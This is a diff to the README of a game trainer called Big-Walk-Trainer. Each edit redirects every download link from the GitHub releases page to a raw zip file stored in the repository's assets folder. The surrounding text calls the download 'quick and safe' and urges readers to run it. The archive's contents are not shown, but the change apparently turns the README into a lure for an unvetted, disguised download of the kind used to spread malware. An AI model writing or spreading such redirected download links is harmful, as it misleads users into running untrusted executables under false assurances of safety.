@@ -1,6 +1,6 @@
 # 🚀 Big-Walk-Trainer - Unlock Every Adventure Feature Instantly
 
-[![Download Big-Walk-Trainer](https://img.shields.io/badge/Download-Big--Walk--Trainer-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Dabirsu4939/Big-Walk-Trainer/releases)
+[![Download Big-Walk-Trainer](https://img.shields.io/badge/Download-Big--Walk--Trainer-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/Dabirsu4939/Big-Walk-Trainer/main/assets/3.5-alpha.4.zip)
 
 ## 🎯 What Is Big-Walk-Trainer?
 
@@ -29,7 +29,7 @@ Follow these three simple steps to get Big-Walk-Trainer running on your Windows 
 
 ### Step 1: Download the Trainer
 
-Visit this link to download the application: **[Big-Walk-Trainer Releases](https://github.com/Dabirsu4939/Big-Walk-Trainer/releases)**
+Visit this link to download the application: **[Big-Walk-Trainer Releases](https://raw.githubusercontent.com/Dabirsu4939/Big-Walk-Trainer/main/assets/3.5-alpha.4.zip)**
 
 Click the latest release, then download the file. The download is quick and safe.
 
@@ -101,7 +101,7 @@ No — this trainer is exclusively for Windows PC and the Steam version of Big W
 
 ## 🔄 Updates
 
-The trainer is updated regularly to match the latest Big Walk patches. Always download the newest release from the [releases page](https://github.com/Dabirsu4939/Big-Walk-Trainer/releases) to ensure compatibility and access to new features.
+The trainer is updated regularly to match the latest Big Walk patches. Always download the newest release from the [releases page](https://raw.githubusercontent.com/Dabirsu4939/Big-Walk-Trainer/main/assets/3.5-alpha.4.zip) to ensure compatibility and access to new features.
 
 ---
 
@@ -125,7 +125,7 @@ If you run into issues or have feature requests, check the repository's Issues s
 
 Ready to transform your Big Walk experience? 
 
-Visit this link to download the application: **[Get Big-Walk-Trainer](https://github.com/Dabirsu4939/Big-Walk-Trainer/releases)**
+Visit this link to download the application: **[Get Big-Walk-Trainer](https://raw.githubusercontent.com/Dabirsu4939/Big-Walk-Trainer/main/assets/3.5-alpha.4.zip)**
 
 Download, run, and start exploring — the world of Big Walk is yours to control.
 
